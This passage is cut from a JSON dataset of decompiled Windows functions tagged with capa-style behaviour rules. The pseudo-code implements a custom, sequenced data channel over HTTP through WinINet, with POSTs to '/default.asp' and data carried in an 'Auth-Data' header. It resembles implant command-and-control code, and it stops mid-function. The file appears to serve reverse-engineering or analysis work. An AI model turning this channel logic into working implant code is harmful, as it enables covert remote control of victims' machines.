        "decompiled_code": "\nint32_t __cdecl fcn.2001c35c(uint32_t n, int32_t *ptr, uint32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t var_18h;\n    uint32_t netshort;\n    uint32_t var_10h;\n    int32_t size;\n    uint8_t *var_8h;\n    int32_t var_4h;\n    \n    uVar2 = n;\n    var_8h = NULL;\n    if (*(n + 8) == 0) {\n        var_4h = 0x21590003;\n    }\n    else {\n        *ptr = 0;\n        fcn.20001567(n + 0x44);\n        puVar6 = *(uVar2 + 0x5c);\n        *(uVar2 + 0x5c) = 0;\n        var_4h = fcn.200135e2(*(uVar2 + 4), &var_8h, &n, arg_14h, arg_18h);\n        while (var_4h == 0) {\n            if (n == 0) {\ncode_r0x2001c54a:\n                *(uVar2 + 8) = 0;\ncode_r0x2001c54e:\n                var_4h = 0x2159000a;\n                goto code_r0x2001c566;\n            }\n            uVar1 = *var_8h;\n            puVar4 = puVar6;\n            if (uVar1 == 0xff) {\n                if (n < 3) goto code_r0x2001c54a;\n                sub.ntdll.dll_memcpy(&netshort, var_8h + 1, 2);\n                var_10h = (*_sym.imp.WS2_32.dll_ntohs)(netshort);\n                netshort = var_10h & 0xffff;\n                var_18h = netshort >> 0xf;\n                var_10h = var_10h & 0x7fff;\n                size = 3;\n                if (netshort != -1) goto code_r0x2001c44e;\n                iVar5 = fcn.2001bea5(n - 3);\n                if (iVar5 != 0) {\n                    fcn.20013299(*(uVar2 + 4), var_8h);\n                    goto code_r0x2001c516;\n                }\n                goto code_r0x2001c54e;\n            }\n            var_18h = uVar1 >> 7;\n            var_10h = uVar1 & 0x7f;\n            size = 1;\ncode_r0x2001c44e:\n            if ((puVar6 == NULL) || (puVar6[3] != var_10h)) {\n                puVar4 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (puVar4 != NULL) {\n                    sub.ntdll.dll_memset(puVar4, 0, 0x10);\n                    iVar5 = (*_sym.imp.msvcrt.dll_malloc)(n - size);\n                    puVar4[1] = iVar5;\n                    if (iVar5 != 0) {\n                        puVar4[2] = n - size;\n                        puVar4[3] = var_10h;\n                        sub.ntdll.dll_memcpy(iVar5, var_8h + size, n - size);\n                        *puVar4 = puVar6;\n                        goto code_r0x2001c501;\n                    }\n                    (*_sym.imp.msvcrt.dll_free)(puVar4);\n                }\ncode_r0x2001c55f:\n                var_4h = 0x21590004;\n                goto code_r0x2001c566;\n            }\n            iVar5 = fcn.2001b82a(puVar6[2]);\n            if (iVar5 != 0) goto code_r0x2001c55f;\n            sub.ntdll.dll_memcpy(puVar6[1] + puVar6[2], var_8h + size, n - size);\n            puVar6[2] = puVar6[2] + (n - size);\ncode_r0x2001c501:\n            puVar6 = puVar4;\n            if (var_18h != 0) goto code_r0x2001c566;\n            fcn.20013299(*(uVar2 + 4), var_8h);\n            var_8h = NULL;\ncode_r0x2001c516:\n            var_4h = fcn.200135e2(*(uVar2 + 4), &var_8h, &n, arg_14h, arg_18h);\n            puVar6 = puVar4;\n        }\n        if (var_4h == 0x21590002) {\n            *(uVar2 + 0x5c) = puVar6;\n            puVar6 = NULL;\n        }\ncode_r0x2001c566:\n        fcn.2000157d(uVar2 + 0x44);\n        fcn.20013299(*(uVar2 + 4), var_8h);\n        if (var_4h == 0) {\n            fcn.2001c085();\n            n = 0;\n            for (puVar4 = puVar6; puVar4 != NULL; puVar4 = *puVar4) {\n                n = n + puVar4[2];\n            }\n            iVar5 = (*_sym.imp.msvcrt.dll_malloc)(n);\n            *ptr = iVar5;\n            if (iVar5 == 0) {\n                var_4h = 0x21590004;\n            }\n            else {\n                n = 0;\n                for (puVar4 = puVar6; puVar4 != NULL; puVar4 = *puVar4) {\n                    sub.ntdll.dll_memcpy(*ptr + n, puVar4[1], puVar4[2]);\n                    n = n + puVar4[2];\n                }\n                if ((*(uVar2 + 0x24) != 0) || (var_4h = fcn.2001bda2(*ptr),  var_4h == 0)) {\n                    *arg_10h = n;\n                }\n            }\n        }\n        for (; puVar6 != NULL; puVar6 = *puVar6) {\n            (*_sym.imp.msvcrt.dll_free)(puVar6[1]);\n        }\n        fcn.2001bc57();\n        piVar3 = ptr;\n        if (var_4h != 0) {\n            (*_sym.imp.msvcrt.dll_free)(*ptr);\n            *piVar3 = 0;\n            *arg_10h = 0;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 1543
    },
    "2001c848": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001c848(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            sub.ntdll.dll_memcpy(arg_8h + 0x4c, arg_10h, 0x10);\n        }\n        else {\n            iVar2 = 0x21590064;\n        }\n    }\n    iVar1 = fcn.200136d0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar2 != 0) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 204
    },
    "2001ca98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001ca98(int32_t arg_8h, uint8_t *arg_ch, int32_t *arg_10h, int32_t *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t s2;\n    uint s1;\n    uchar var_4h;\n    uint8_t var_3h;\n    uchar var_2h;\n    \n    iVar5 = *(in_EAX + 0xc);\n    s2 = 0;\n    var_14h = 0;\njoined_r0x2001caae:\n    if (iVar5 != 0) {\n        iVar5 = 0x21590006;\ncode_r0x2001cfb5:\n        fcn.20013299(*(in_EAX + 4), s2);\n        return iVar5;\n    }\n    if (*(in_EAX + 8) == 0) {\ncode_r0x2001cf53:\n        iVar5 = 0x21590003;\n        goto code_r0x2001cfb5;\n    }\n    if ((*(in_EAX + 0x6c) != 0) && (*(in_EAX + 0x10) == 3)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        uVar8 = *(in_EAX + 0x60);\n        iVar5 = *(in_EAX + 0xac);\n        uVar4 = fcn.200018bf();\n        if (uVar4 % uVar8 + 1 + (uVar8 >> 1) < iVar3 - iVar5) {\n            var_4h = *(in_EAX + 0x14);\n            var_2h = fcn.200018bf();\n            var_3h = 0x10;\n            iVar5 = fcn.2001c77a(0);\n            if (iVar5 != 0) goto code_r0x2001cfb5;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            *(in_EAX + 0xac) = uVar6;\n        }\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar8 = *(in_EAX + 0x5c) * *(in_EAX + 0x60);\n    uVar4 = iVar5 - *(in_EAX + 0xb0);\n    if (uVar4 < uVar8) {\n        uVar8 = uVar8 - uVar4;\n    }\n    else {\n        uVar8 = 0;\n    }\n    bVar9 = arg_18h < uVar8;\n    if (bVar9) {\n        uVar8 = arg_18h;\n    }\n    if (arg_18h != 0xffffffff) {\n        var_14h = (*pcVar2)();\n    }\n    iVar5 = fcn.200135e2(*(in_EAX + 4), &s2, &var_10h, uVar8, 0);\n    if (arg_18h != 0xffffffff) {\n        iVar3 = (*pcVar2)();\n        if (iVar3 - var_14h < arg_18h) {\n            arg_18h = arg_18h - (iVar3 - var_14h);\n        }\n        else {\n            arg_18h = 0;\n        }\n    }\n    if (iVar5 != 0) {\n        if (iVar5 != 0x21590002) goto code_r0x2001cfb5;\n        iVar3 = (*pcVar2)();\n        if (*(in_EAX + 0x5c) * *(in_EAX + 0x60) <= iVar3 - *(in_EAX + 0xb0)) {\n            *(in_EAX + 8) = 0;\n            goto code_r0x2001cfb5;\n        }\n        if ((bVar9) || (arg_18h == 0)) goto code_r0x2001cfb5;\n        goto code_r0x2001cf2c;\n    }\n    if (var_10h < 3) {\ncode_r0x2001cbeb:\n        if ((*(in_EAX + 0x10) == 2) || (*(in_EAX + 0x10) == 1)) {\n            iVar5 = 0x2159000a;\n            goto code_r0x2001cfb5;\n        }\ncode_r0x2001cf1b:\n        fcn.20013299(*(in_EAX + 4), s2);\n    }\n    else {\n        sub.ntdll.dll_memcpy(&s1, s2, 3);\n        s1._0_1_ = s1 ^ s1._2_1_ >> 1;\n        s1._1_1_ = s1._1_1_ ^ s1._2_1_ >> 1;\n        if ((s1._1_1_ & 0x40) != 0) goto code_r0x2001cbeb;\n        uVar6 = (*pcVar2)();\n        *(in_EAX + 0xb0) = uVar6;\n        iVar5 = *(in_EAX + 0x10);\n        if (((iVar5 == 2) || (iVar5 == 1)) && ((s1._1_1_ & 0x21) == 0)) {\n            if (iVar5 != 2) {\n                sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                var_3h = 0x20;\n                fcn.2001c77a(0);\n            }\n            goto code_r0x2001cf1b;\n        }\n        if ((iVar5 != 0) || ((s1._1_1_ & 0x22) != 0)) {\n            if (((iVar5 == 1) && (((s1._1_1_ & 1) != 0 && ((s1._1_1_ & 4) == 0)))) ||\n               ((iVar5 == 3 && (((s1._1_1_ & 0x11) != 0 && ((s1._1_1_ & 4) == 0)))))) {\n                sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                var_3h = var_3h | 4;\n                iVar5 = fcn.2001c77a(0);\n                if (iVar5 != 0) goto code_r0x2001cfb5;\n                if (((s1._1_1_ & 1) != 0) && (*(in_EAX + 0x10) == 1)) {\n                    *(in_EAX + 0x15) = s1 + 1;\n                    *(in_EAX + 0x10) = 3;\n                }\n            }\n            iVar5 = *(in_EAX + 0x10);\n            if ((((iVar5 == 3) || (iVar5 == 2)) && ((s1._1_1_ & 4) != 0)) &&\n               (((s1._1_1_ & 0x10) == 0 && (s1 == *(in_EAX + 0x14))))) {\n                if (((s1._1_1_ & 1) != 0) && (iVar5 == 2)) {\n                    *(in_EAX + 0x10) = 3;\n                }\n                if (arg_8h != 1) {\n                    fcn.20001567(in_EAX + 0x70);\n                    *(in_EAX + 0x98) = s1._2_1_;\n                    *(in_EAX + 0x9c) = 1;\n                    fcn.200012c9(in_EAX + 0x90);\n                    fcn.2000157d(in_EAX + 0x70);\n                    goto code_r0x2001cd80;\n                }\n                *arg_ch = s1._2_1_;\ncode_r0x2001cf4b:\n                iVar5 = 0;\n                goto code_r0x2001cfb5;\n            }\ncode_r0x2001cd80:\n            if (((s1._1_1_ & 0x20) != 0) && ((s1 == *(in_EAX + 0x14) || (s1 == *(in_EAX + 0x15))))) {\n                *(in_EAX + 0x10) = 0;\n                goto code_r0x2001cf53;\n            }\n            if ((*(in_EAX + 0x10) == 3) && ((s1._1_1_ & 8) != 0)) {\n                if (s1 == *(in_EAX + 0x15)) {\n                    if (arg_8h == 2) {\n                        sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                        var_3h = 4;\n                        iVar5 = fcn.2001c77a(0);\n                        if (iVar5 == 0) {\n                            *(in_EAX + 0x15) = *(in_EAX + 0x15) + '\\x01';\n                            *arg_10h = s2 + 3;\n                            s2 = 0;\n                            *arg_14h = var_10h - 3;\n                            goto code_r0x2001cf4b;\n                        }\n                    }\n                    else {\n                        fcn.20001567(in_EAX + 0x70);\n                        if (*(in_EAX + 0xc) == 0) {\n                            if (*(in_EAX + 8) != 0) {\n                                if ((*(in_EAX + 0xa8) + var_10h < 0x100000) &&\n                                   (piVar7 = (*_sym.imp.msvcrt.dll_malloc)(0x10),  piVar7 != NULL)) {\n                                    sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                                    var_3h = 4;\n                                    iVar5 = fcn.2001c77a(0);\n                                    if (iVar5 != 0) goto code_r0x2001cfab;\n                                    sub.ntdll.dll_memset(piVar7, 0, 0x10);\n                                    piVar7[1] = s2;\n                                    piVar7[2] = var_10h;\n                                    s2 = 0;\n                                    piVar1 = *(in_EAX + 0xa4);\n                                    if (piVar1 == NULL) {\n                                        *(in_EAX + 0xa0) = piVar7;\n                                    }\n                                    else {\n                                        *piVar1 = piVar7;\n                                    }\n                                    *(in_EAX + 0xa4) = piVar7;\n                                    *(in_EAX + 0xa8) = *(in_EAX + 0xa8) + var_10h;\n                                    fcn.200012c9(in_EAX + 0x90);\n                                    *(in_EAX + 0x15) = *(in_EAX + 0x15) + '\\x01';\n                                }\n                                fcn.2000157d(in_EAX + 0x70);\n                                goto code_r0x2001cece;\n                            }\n                            iVar5 = 0x21590003;\n                        }\n                        else {\n                            iVar5 = 0x21590006;\n                        }\ncode_r0x2001cfab:\n                        fcn.2000157d(in_EAX + 0x70);\n                    }\n                    goto code_r0x2001cfb5;\n                }\n                if (*(in_EAX + 0x15) - s1 < 0x7f) {\n                    sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                    var_3h = 4;\n                }\n                else {\n                    sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                    var_3h = 0x20;\n                }\n                iVar5 = fcn.2001c77a(0);\n                if (iVar5 != 0) goto code_r0x2001cfb5;\n            }\ncode_r0x2001cece:\n            if (((s1._1_1_ & 2) != 0) && (s1 == *(in_EAX + 0x15))) {\n                sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n                var_3h = 4;\n                iVar5 = fcn.2001c77a(0);\n                if (iVar5 == 0) {\n                    *(in_EAX + 0x10) = 0;\n                    *(in_EAX + 8) = 0;\n                    fcn.200012c9(in_EAX + 0x90);\n                    goto code_r0x2001cf1b;\n                }\n                goto code_r0x2001cfb5;\n            }\n            goto code_r0x2001cf1b;\n        }\n        sub.ntdll.dll_memcpy(&var_4h, &s1, 3);\n        var_3h = 2;\n        fcn.2001c77a(0);\n        fcn.20013299(*(in_EAX + 4), s2);\n    }\n    s2 = 0;\ncode_r0x2001cf2c:\n    iVar5 = *(in_EAX + 0xc);\n    goto joined_r0x2001caae;\n}\n",
        "token_count": 3062
    },
    "2001d48b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001d48b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    int32_t *piVar4;\n    \n    if (*(arg_8h + 0x10) == 3) {\n        if (arg_ch == 1) {\n            fcn.200018bf();\n            fcn.2001c77a(1);\n        }\n        else {\n            fcn.2001d2c7(0, 0, 2);\n            *(arg_8h + 0x10) = 0;\n        }\n    }\n    if (*(arg_8h + 8) != 0) {\n        *(arg_8h + 8) = 0;\n    }\n    *(arg_8h + 0xc) = 1;\n    fcn.20001567(arg_8h + 0x70);\n    piVar4 = *(arg_8h + 0xa0);\n    if (*(arg_8h + 0xa0) != NULL) {\n        do {\n            piVar2 = *piVar4;\n            fcn.20013299(*(arg_8h + 4), piVar4[1]);\n            (*_sym.imp.msvcrt.dll_free)(piVar4);\n            piVar4 = piVar2;\n        } while (piVar2 != NULL);\n        *(arg_8h + 0xa0) = 0;\n        *(arg_8h + 0xa4) = 0;\n    }\n    iVar1 = arg_8h + 0x70;\n    fcn.2000157d(iVar1);\n    fcn.20013237(arg_8h + 4, 0);\n    while( true ) {\n        fcn.20001567(iVar1);\n        bVar3 = false;\n        if ((*(arg_8h + 0x88) == 0) && (*(arg_8h + 0x8c) == 0)) {\n            bVar3 = true;\n        }\n        fcn.2000157d(iVar1);\n        if (bVar3) break;\n        fcn.200012c9(arg_8h + 0x90);\n        (*_sym.imp.KERNEL32.dll_Sleep)(10);\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "2001d766": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001d766(char *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    char *var_4h;\n    \n    var_4h = 0x2002fd6c;\n    if (arg_8h != NULL) {\n        var_4h = \"POST\";\n    }\n    arg_8h = *(unaff_ESI + 0x3c);\n    if (arg_8h == NULL) {\n        arg_8h = \"/default.asp\";\n    }\n    sub.ntdll.dll_memset();\n    piVar1 = unaff_EDI + 1;\n    fcn.200012fa(piVar1);\n    iVar2 = (*_sym.imp.WININET.dll_HttpOpenRequestA)\n                      (*(unaff_ESI + 0x10), var_4h, arg_8h, \"HTTP/1.1\", 0, ~-(*(unaff_ESI + 0x74) != 0) & 0x20046984, \n                       (-(*(unaff_ESI + 0x78) != 0) & 0xffffff00) + 0x100 | 0x468fa00);\n    unaff_EDI[4] = iVar2;\n    if (iVar2 == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (arg_8h == 0x3e5) {\n            iVar2 = fcn.200012d6(piVar1, 60000);\n            if (iVar2 == 0x102) {\n                arg_8h = 0x21590002;\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(*(unaff_ESI + 0x10));\n                *(unaff_ESI + 0x10) = 0;\n                goto code_r0x2001d835;\n            }\n            arg_8h = *unaff_EDI;\n        }\n    }\n    else {\n        arg_8h = NULL;\n    }\n    if (arg_8h == NULL) {\n        return 0;\n    }\ncode_r0x2001d835:\n    fcn.200012a9(piVar1);\n    sub.ntdll.dll_memset();\n    return arg_8h;\n}\n",
        "token_count": 524
    },
    "2001d84e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001d84e(int32_t s2, int32_t arg_ch, int32_t arg_10h, int32_t *s, uint arg_18h, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *arg_8h;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    ulong uVar7;\n    uint var_2ch;\n    uint ptr;\n    char *n;\n    uint *var_1ch;\n    int32_t var_14h;\n    uint32_t var_10h;\n    char *src;\n    int32_t s1;\n    int32_t size;\n    \n    s1 = 0;\n    sub.ntdll.dll_memset(s, 0, 0x18);\n    size = 8;\n    if (arg_ch <= *(arg_10h + 0x44)) {\n        size = arg_ch + 8;\n    }\n    arg_8h = (*_sym.imp.msvcrt.dll_malloc)(size);\n    var_1ch = arg_8h;\n    if (arg_8h != NULL) {\n        *arg_8h = *(arg_10h + 0x14);\n        *(arg_8h + 1) = arg_18h;\n        *(arg_8h + 6) = arg_1ch;\n        *(arg_8h + 6) = (*(arg_10h + 0x4c) << 4 ^ arg_1ch) & 0x30 ^ arg_1ch;\n        cVar2 = '\\0';\n        iVar3 = 7;\n        puVar4 = arg_8h;\n        do {\n            cVar2 = cVar2 + *puVar4;\n            puVar4 = puVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        *(arg_8h + 7) = cVar2;\n        fcn.2001d684();\n        if (arg_ch <= *(arg_10h + 0x44)) {\n            sub.ntdll.dll_memcpy(arg_8h + 2, s2, arg_ch);\n        }\n        src = *(arg_10h + 0x40);\n        if (src == NULL) {\n            src = \"Auth-Data\";\n        }\n        iVar3 = sub.ntdll.dll_strlen(src);\n        iVar5 = iVar3 + 2;\n        s1 = (*_sym.imp.msvcrt.dll_malloc)(iVar3 + 0x18 + size * 2);\n        if (s1 != 0) {\n            sub.ntdll.dll_strcpy(s1, src);\n            sub.ntdll.dll_strcat(s1, 0x2002fda8);\n            if (*(arg_10h + 0x48) == 0) {\n                fcn.2002380e(s1 + iVar5);\n                src = 0xa;\n            }\n            else {\n                iVar3 = fcn.2002395a(arg_10h + 0x48, &var_2ch);\n                if (iVar3 == 0) goto code_r0x2001d895;\n                sub.ntdll.dll_memcpy(s1 + iVar5, ptr, n);\n                (*_sym.imp.msvcrt.dll_free)(ptr);\n                src = n;\n            }\n            var_14h = fcn.2000130b(arg_8h, src + s1 + iVar5, size);\n            var_10h = arg_ch <= *(arg_10h + 0x44);\n            if (((arg_1ch & 2) == 0) || (var_10h != 0)) {\n                size = fcn.2001d766(var_10h == 0);\n                arg_8h = var_1ch;\n                if (size == 0) {\n                    iVar3 = 0;\n                    pcVar6 = src + iVar5 + var_14h;\n                    if (var_10h == 0) {\n                        iVar5 = (*_sym.imp.WININET.dll_HttpSendRequestA)(s[4], s1, pcVar6, s2, arg_ch);\n                    }\n                    else {\n                        iVar5 = (*_sym.imp.WININET.dll_HttpSendRequestA)(s[4], s1, pcVar6, 0, 0);\n                    }\n                    if (iVar5 == 0) {\n                        size = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (size == 0x3e5) {\n                            iVar5 = fcn.200012d6(s + 1, 60000);\n                            if (iVar5 == 0x102) {\n                                size = 0x21590002;\n                            }\n                            else {\n                                size = *s;\n                            }\n                        }\n                    }\n                    else {\n                        size = 0;\n                    }\n                    if (*0x20047050 != 0) {\n                        fcn.20001567(0x20047054);\n                        if (*0x20047050 != 0) {\n                            uVar7 = (*_sym.imp.msvcrt.dll__time64)(0);\n                            pcVar1 = _sym.imp.msvcrt.dll_fprintf;\n                            var_14h = uVar7 >> 0x20;\n                            (*_sym.imp.msvcrt.dll_fprintf)\n                                      (*0x20047050, \"WR\\tti=%u\\tst=%d\\tso=%x\\tid=%u\\tfl=%x\\tsi=%d\\tda=\", uVar7, size, \n                                       arg_10h, arg_18h, arg_1ch, arg_ch);\n                            if (0 < arg_ch) {\n                                do {\n                                    if (0x1f < iVar3) break;\n                                    (*pcVar1)(*0x20047050, \"%02x\", *(iVar3 + s2));\n                                    iVar3 = iVar3 + 1;\n                                } while (iVar3 < arg_ch);\n                            }\n                            (*pcVar1)(*0x20047050, \"\\tbu=\");\n                            (*_sym.imp.msvcrt.dll_fwrite)(s1, pcVar6, 1, *0x20047050);\n                            (*pcVar1)(*0x20047050, 0x2002fd70);\n                            (*_sym.imp.msvcrt.dll_fflush)(*0x20047050);\n                        }\n                        fcn.2000157d(0x20047054);\n                    }\n                    arg_8h = var_1ch;\n                    if ((size != 0) && (s[4] != 0)) {\n                        (*_sym.imp.WININET.dll_InternetCloseHandle)(s[4]);\n                        arg_8h = var_1ch;\n                    }\n                }\n            }\n            else {\n                size = 0x21590064;\n            }\n            goto code_r0x2001db49;\n        }\n    }\ncode_r0x2001d895:\n    size = 0x21590004;\ncode_r0x2001db49:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(arg_8h);\n    (*pcVar1)(s1);\n    if (size != 0) {\n        iVar3 = fcn.200012e7(s + 1);\n        if (iVar3 != 0) {\n            fcn.200012a9(s + 1);\n        }\n        sub.ntdll.dll_memset(s, 0, 0x18);\n    }\n    return size;\n}\n",
        "token_count": 1652
    },
    "2001db8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.2001db8c(int32_t *s, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char cVar6;\n    int32_t iVar7;\n    ulong uVar8;\n    uint var_2ch;\n    uint ptr;\n    int32_t n;\n    uint var_1ch;\n    uint32_t hostshort;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    char *src;\n    \n    sub.ntdll.dll_memset(s, 0, 0x18);\n    var_1ch = *(in_EAX + 0x14);\n    puVar3 = &var_1ch;\n    cVar6 = '\\0';\n    iVar7 = 7;\n    do {\n        cVar6 = cVar6 + *puVar3;\n        puVar3 = puVar3 + 1;\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    hostshort = CONCAT13(cVar6, CONCAT12((*(in_EAX + 0x4c) << 4 ^ arg_10h) & 0x30 ^ arg_10h, arg_ch)) | 0x20000;\n    var_1ch = (*_sym.imp.WS2_32.dll_htonl)(*(in_EAX + 0x14));\n    uVar2 = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n    hostshort = hostshort & 0xffff0000 | uVar2;\n    src = *(in_EAX + 0x40);\n    if (src == NULL) {\n        src = \"Auth-Data\";\n    }\n    iVar4 = sub.ntdll.dll_strlen(src);\n    iVar7 = iVar4 + 2;\n    iVar4 = (*_sym.imp.msvcrt.dll_malloc)(iVar4 + 0x28);\n    if (iVar4 == 0) {\n        return 0x21590004;\n    }\n    var_8h = iVar4;\n    sub.ntdll.dll_strcpy(iVar4, src);\n    sub.ntdll.dll_strcat(iVar4, 0x2002fda8);\n    if (*(in_EAX + 0x48) == 0) {\n        fcn.2002380e(iVar4 + iVar7);\n        var_ch = 10;\n    }\n    else {\n        iVar5 = fcn.2002395a(in_EAX + 0x48, &var_2ch);\n        if (iVar5 == 0) {\n            src = 0x21590004;\n            goto code_r0x2001ddc2;\n        }\n        sub.ntdll.dll_memcpy(iVar4 + iVar7, ptr, n);\n        (*_sym.imp.msvcrt.dll_free)(ptr);\n        var_ch = n;\n    }\n    var_10h = fcn.2000130b(&var_1ch, iVar4 + var_ch + iVar7, 8);\n    src = fcn.2001d766(0);\n    iVar4 = var_8h;\n    if (src == NULL) {\n        iVar7 = var_10h + var_ch + iVar7;\n        iVar4 = (*_sym.imp.WININET.dll_HttpSendRequestA)(s[4], var_8h, iVar7, 0, 0);\n        if (iVar4 == 0) {\n            src = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (src == 0x3e5) {\n                iVar4 = fcn.200012d6(s + 1, 60000);\n                if (iVar4 == 0x102) {\n                    src = 0x21590002;\n                }\n                else {\n                    src = *s;\n                }\n            }\n        }\n        else {\n            src = NULL;\n        }\n        if (*0x20047050 != 0) {\n            fcn.20001567(0x20047054);\n            if (*0x20047050 != 0) {\n                uVar8 = (*_sym.imp.msvcrt.dll__time64)(0);\n                pcVar1 = _sym.imp.msvcrt.dll_fprintf;\n                var_10h = uVar8 >> 0x20;\n                (*_sym.imp.msvcrt.dll_fprintf)(*0x20047050, \"FK\\tti=%u\\tst=%d\\tso=%x\\tid=%u\\tfl=%x\\tbu=\", uVar8, src);\n                (*_sym.imp.msvcrt.dll_fwrite)(var_8h, iVar7, 1, *0x20047050);\n                (*pcVar1)(*0x20047050, 0x2002fd70);\n                (*_sym.imp.msvcrt.dll_fflush)(*0x20047050);\n            }\n            fcn.2000157d(0x20047054);\n        }\n        iVar4 = var_8h;\n        if ((src != NULL) && (s[4] != 0)) {\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(s[4]);\n            iVar4 = var_8h;\n        }\n    }\ncode_r0x2001ddc2:\n    (*_sym.imp.msvcrt.dll_free)(iVar4);\n    if (src != NULL) {\n        iVar7 = fcn.200012e7(s + 1);\n        if (iVar7 != 0) {\n            fcn.200012a9(s + 1);\n        }\n        sub.ntdll.dll_memset(s, 0, 0x18);\n    }\n    return src;\n}\n",
        "token_count": 1262
    },
    "2001ddfd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.2001ddfd(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h, uint32_t *arg_14h, int32_t *s, uint arg_1ch, \n            uint arg_20h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ulong uVar9;\n    uint s1;\n    uint str;\n    uint var_11ch;\n    uint var_20h;\n    int32_t ptr;\n    int32_t var_18h;\n    uint32_t size;\n    int32_t hostlong;\n    uchar hostshort [2];\n    uint32_t var_ah;\n    int32_t var_4h;\n    \n    iVar7 = 0;\n    ptr = 0;\n    sub.ntdll.dll_memset(&hostlong, 0, 8);\n    *arg_ch = 0;\n    iVar5 = (*_sym.imp.WININET.dll_InternetReadFile)(s[4], &hostlong, 8, &var_4h);\n    if ((iVar5 == 0) && (iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar7 == 0x3e5)) {\n        var_18h = iVar7;\n        